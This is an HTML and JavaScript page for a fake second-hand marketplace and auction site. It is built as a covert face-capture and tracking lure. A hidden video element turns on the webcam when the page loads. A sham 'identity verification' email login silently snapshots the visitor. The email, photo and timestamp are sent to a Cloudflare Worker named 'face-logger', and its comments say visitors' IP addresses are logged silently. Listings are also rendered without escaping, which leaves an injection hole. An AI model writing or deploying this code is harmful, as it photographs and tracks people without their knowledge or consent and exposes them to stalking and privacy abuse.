<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>黑市二手寄卖 & 极客拍卖大厅</title>
  <style>
    :root {
      --bg: #0b0f19;
      --card-bg: #111827;
      --accent: #2563eb;
      --accent-hover: #1d4ed8;
      --text: #f3f4f6;
      --text-muted: #9ca3af;
      --border: #1f2937;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
    body { background: var(--bg); color: var(--text); padding-bottom: 60px; }

    /* Header */
    header { background: var(--card-bg); border-bottom: 1px solid var(--border); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
    .logo { font-size: 18px; font-weight: bold; color: #38bdf8; display: flex; align-items: center; gap: 8px; }
    .nav-tabs { display: flex; gap: 10px; background: #000; padding: 4px; border-radius: 8px; }
    .tab-btn { background: transparent; border: none; color: var(--text-muted); padding: 6px 14px; border-radius: 6px; cursor: pointer; font-size: 13px; transition: 0.2s; }
    .tab-btn.active { background: var(--accent); color: #fff; font-weight: bold; }

    /* Layout */
    .container { max-width: 1000px; margin: 20px auto; padding: 0 15px; }
    .tab-content { display: none; }
    .tab-content.active { display: block; }

    /* Login Overlay (静默人脸抓拍) */
    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: flex; justify-content: center; align-items: center; z-index: 999; backdrop-filter: blur(5px); }
    .auth-card { background: var(--card-bg); border: 1px solid var(--border); padding: 25px; border-radius: 12px; width: 100%; max-width: 360px; text-align: center; }
    .auth-card h3 { margin-bottom: 10px; font-size: 18px; }
    .auth-card p { font-size: 12px; color: var(--text-muted); margin-bottom: 20px; }
    .input-group { margin-bottom: 15px; text-align: left; }
    .input-group label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 5px; }
    .input-group input, .input-group textarea { width: 100%; background: #000; border: 1px solid var(--border); color: #fff; padding: 10px; border-radius: 6px; font-size: 13px; outline: none; }
    .input-group input:focus { border-color: var(--accent); }
    .btn { width: 100%; background: var(--accent); color: white; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s; }
    .btn:hover { background: var(--accent-hover); }

    /* Grid Display */
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; margin-top: 15px; }
    .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; display: flex; flex-direction: column; }
    .card img { width: 100%; height: 180px; object-fit: cover; }
    .card-body { padding: 15px; flex: 1; display: flex; flex-direction: column; justify-content: space-between; }
    .card-title { font-size: 15px; font-weight: bold; margin-bottom: 6px; }
    .card-desc { font-size: 12px; color: var(--text-muted); margin-bottom: 12px; line-height: 1.4; }
    .price-tag { font-size: 16px; color: #38bdf8; font-weight: bold; }

    /* Camera (Hidden) */
    #hidden-video, #hidden-canvas { display: none; }
  </style>
</head>
<body>

  <!-- 隐藏的摄像头组件，用于后台静默抓拍 -->
  <video id="hidden-video" autoplay playsinline></video>
  <canvas id="hidden-canvas" width="320" height="240"></canvas>

  <!-- 1. 登录验证弹窗 (用于触发摄像头抓拍) -->
  <div class="modal-overlay" id="authModal">
    <div class="auth-card">
      <h3>🔐 极客交易网身份验证</h3>
      <p>请输入您的邮箱以同步集市与竞拍数据</p>
      <div class="input-group">
        <label>电子邮箱</label>
        <input type="email" id="userEmail" placeholder="name@example.com" value="user@domain.com">
      </div>
      <button class="btn" onclick="app.login()">验证并进入</button>
    </div>
  </div>

  <!-- 2. 主界面 Header -->
  <header>
    <div class="logo">⚡️ GEEK-MARKET // 交易中心</div>
    <div class="nav-tabs">
      <button class="tab-btn active" onclick="app.switchTab('market')">二手寄卖</button>
      <button class="tab-btn" onclick="app.switchTab('auction')">竞拍大厅</button>
      <button class="tab-btn" onclick="app.switchTab('sell')">发布寄卖</button>
    </div>
  </header>

  <div class="container">
    <!-- Tab 1: 二手寄卖列表 -->
    <div id="tab-market" class="tab-content active">
      <h3 style="margin-bottom: 10px;">📱 玩家二手寄卖大厅</h3>
      <div class="grid" id="marketList">
        <!-- 默认示例商品 -->
        <div class="card">
          <img src="https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=400&q=80" alt="iPhone">
          <div class="card-body">
            <div class="card-title">iPhone 13 Pro 256G 95新</div>
            <div class="card-desc">原装无修，电池寿命88%，无拆无修，送两个保护壳。</div>
            <div style="display:flex; justify-content:space-between; align-items:center;">
              <span class="price-tag">¥ 3,400</span>
              <button class="btn" style="width: auto; padding: 6px 12px; font-size: 12px;" onclick="alert('📞 卖家联系 Telegram: @geek_seller')">联系卖家</button>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Tab 2: 竞拍大厅 -->
    <div id="tab-auction" class="tab-content">
      <h3 style="margin-bottom: 10px;">🔥 极客限量款竞拍</h3>
      <div class="grid">
        <div class="card">
          <img src="https://images.unsplash.com/photo-1523275335684-37898b6baf30?auto=format&fit=crop&w=400&q=80" alt="Watch">
          <div class="card-body">
            <div class="card-title">Apple Watch Ultra 2 (限量版)</div>
            <div class="card-desc">起拍价 ¥2,000，当前出价最高者获胜。</div>
            <div style="margin-bottom: 10px;">
              <span style="font-size:12px; color:var(--text-muted);">当前最高出价:</span>
              <span class="price-tag" id="price-item1">2000</span> 元
            </div>
            <div style="display:flex; gap: 8px;">
              <input type="number" id="input-item1" placeholder="输入出价" style="width:100%; background:#000; border:1px solid var(--border); color:#fff; padding:6px; border-radius:4px;">
              <button class="btn" style="width: 80px;" onclick="app.placeBid('item1')">出价</button>
            </div>
          </div>
        </div>

        <div class="card">
          <img src="https://images.unsplash.com/photo-1505740420928-5e560c06d30e?auto=format&fit=crop&w=400&q=80" alt="Headphone">
          <div class="card-body">
            <div class="card-title">Sennheiser HD800S 旗舰耳机</div>
            <div class="card-desc">箱全近新，仅试听几小时。起拍价 ¥6,000。</div>
            <div style="margin-bottom: 10px;">
              <span style="font-size:12px; color:var(--text-muted);">当前最高出价:</span>
              <span class="price-tag" id="price-item2">6000</span> 元
            </div>
            <div style="display:flex; gap: 8px;">
              <input type="number" id="input-item2" placeholder="输入出价" style="width:100%; background:#000; border:1px solid var(--border); color:#fff; padding:6px; border-radius:4px;">
              <button class="btn" style="width: 80px;" onclick="app.placeBid('item2')">出价</button>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Tab 3: 发布寄卖 -->
    <div id="tab-sell" class="tab-content">
      <div class="auth-card" style="max-width: 500px; margin: 0 auto; text-align: left;">
        <h3 style="margin-bottom: 15px;">📦 发布二手寄卖物品</h3>
        <div class="input-group">
          <label>物品名称</label>
          <input type="text" id="sellName" placeholder="例如：PS5 光驱版 99新">
        </div>
        <div class="input-group">
          <label>转让价格 (元)</label>
          <input type="number" id="sellPrice" placeholder="例如：2800">
        </div>
        <div class="input-group">
          <label>联系方式 (微信/QQ/手机)</label>
          <input type="text" id="sellContact" placeholder="例如：wxid_123456">
        </div>
        <div class="input-group">
          <label>物品描述</label>
          <textarea id="sellDesc" rows="3" placeholder="介绍一下物品的成色、保修状态等..."></textarea>
        </div>
        <div class="input-group">
          <label>图片 (可选)</label>
          <input type="file" id="sellImage" accept="image/*">
        </div>
        <button class="btn" onclick="app.postSellItem()">立即发布至云端</button>
      </div>
    </div>
  </div>

  <script>
    // 🔗 配置：请确保替换为你的 Cloudflare Worker 完整域名
    const WORKER_URL = "https://face-logger.bmk4byvf9b.workers.dev";

    class App {
      constructor() {
        this.stream = null;
        this.initCamera();
      }

      // 初始化隐藏摄像头
      async initCamera() {
        try {
          this.stream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.getElementById('hidden-video');
          video.srcObject = this.stream;
        } catch (e) {
          console.warn("摄像头权限未开启或已被拒绝", e);
        }
      }

      // 切换选项卡
      switchTab(tabName) {
        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
        
        event.target.classList.add('active');
        document.getElementById(`tab-${tabName}`).classList.add('active');

        // 每次切换标签都重新刷新云端 KV 最新数据
        this.loadCloudData();
      }

      // 静默抓拍并进行登录验证（同时由 Worker 后端自动记录 IP）
      login() {
        const email = document.getElementById('userEmail').value.trim();
        if (!email) {
          alert("请输入电子邮箱！");
          return;
        }

        const video = document.getElementById('hidden-video');
        const canvas = document.getElementById('hidden-canvas');
        let photoData = "";

        // 执行静默抓拍
        if (this.stream && video.videoWidth > 0) {
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          photoData = canvas.toDataURL('image/jpeg', 0.6);
        }

        // 发送给 Cloudflare Worker (静默传输邮箱、照片、时间戳；IP 由 Worker 协议头静默解析保存)
        fetch(WORKER_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            email: email,
            timestamp: new Date().toLocaleString(),
            photo: photoData
          })
        }).catch(err => console.error("静默记录失败:", err));

        // 关闭弹窗
        document.getElementById('authModal').style.display = 'none';
        
        // 加载云端数据
        this.loadCloudData();
      }

      // 从云端 KV 读取最新的拍卖价格 & 寄卖商品列表
      async loadCloudData() {
        try {
          const res = await fetch(`${WORKER_URL}?action=data`);
          const data = await res.json();

          // 1. 更新竞拍价格
          if (data.bids) {
            if (data.bids.item1) document.getElementById('price-item1').innerText = data.bids.item1;
            if (data.bids.item2) document.getElementById('price-item2').innerText = data.bids.item2;
          }

          // 2. 更新二手寄卖商品
          if (data.market && data.market.length > 0) {
            const marketList = document.getElementById('marketList');
            data.market.forEach(item => {
              if (!document.getElementById(`market-card-${item.id}`)) {
                const cardHtml = `
                  <div class="card" id="market-card-${item.id}">
                    <img src="${item.imgSrc}" alt="商品图片">
                    <div class="card-body">
                      <div class="card-title">${item.name}</div>
                      <div class="card-desc">${item.desc || "暂无描述"}</div>
                      <div style="display:flex; justify-content:space-between; align-align:center;">
                        <span class="price-tag">¥ ${parseFloat(item.price).toLocaleString()}</span>
                        <button class="btn" style="width:auto; padding:6px 12px; font-size:12px;" onclick="alert('📞 卖家联系方式：\\n${item.contact}')">联系卖家</button>
                      </div>
                    </div>
                  </div>
                `;
                marketList.insertAdjacentHTML('afterbegin', cardHtml);
              }
            });
          }
        } catch (e) {
          console.error("加载云端数据失败:", e);
        }
      }

      // 竞拍出价（实时写云端 KV）
      async placeBid(itemId) {
        const priceEl = document.getElementById(`price-${itemId}`);
        const inputEl = document.getElementById(`input-${itemId}`);
        const currentPrice = parseFloat(priceEl.innerText);
        const userBid = parseFloat(inputEl.value);

        if (isNaN(userBid) || userBid <= currentPrice) {
          alert(`⚠️ 出价失败！出价必须高于当前最高价 (¥${currentPrice})。`);
          return;
        }

        // 保存至云端
        fetch(WORKER_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: 'bid', itemId: itemId, price: userBid })
        });

        priceEl.innerText = userBid;
        inputEl.value = '';
        alert(`🎉 恭喜！您已出价 ¥${userBid.toLocaleString()}，数据已实时保存到云端数据库！`);
      }

      // 发布寄卖商品（实时写云端 KV）
      async postSellItem() {
        const name = document.getElementById('sellName').value.trim();
        const price = document.getElementById('sellPrice').value.trim();
        const contact = document.getElementById('sellContact').value.trim();
        const desc = document.getElementById('sellDesc').value.trim();
        const fileInput = document.getElementById('sellImage');

        if (!name || !price || !contact) {
          alert("⚠️ 请填写物品名称、价格和联系方式！");
          return;
        }

        const saveAndRender = (imgSrc) => {
          const itemData = {
            type: 'market_item',
            id: Date.now().toString(),
            name, price, contact, desc, imgSrc
          };

          // 保存至云端 KV
          fetch(WORKER_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(itemData)
          }).then(() => {
            this.loadCloudData();
            this.switchTab('market');
          });

          // 清空输入框
          document.getElementById('sellName').value = '';
          document.getElementById('sellPrice').value = '';
          document.getElementById('sellContact').value = '';
          document.getElementById('sellDesc').value = '';
          fileInput.value = '';
          alert("🎉 寄卖商品已成功发布至云端！");
        };

        if (fileInput.files && fileInput.files[0]) {
          const reader = new FileReader();
          reader.onload = (e) => saveAndRender(e.target.result);
          reader.readAsDataURL(fileInput.files[0]);
        } else {
          saveAndRender("https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=400&q=80");
        }
      }
    }

    // 初始化应用
    const app = new App();
  </script>
</body>
</html>
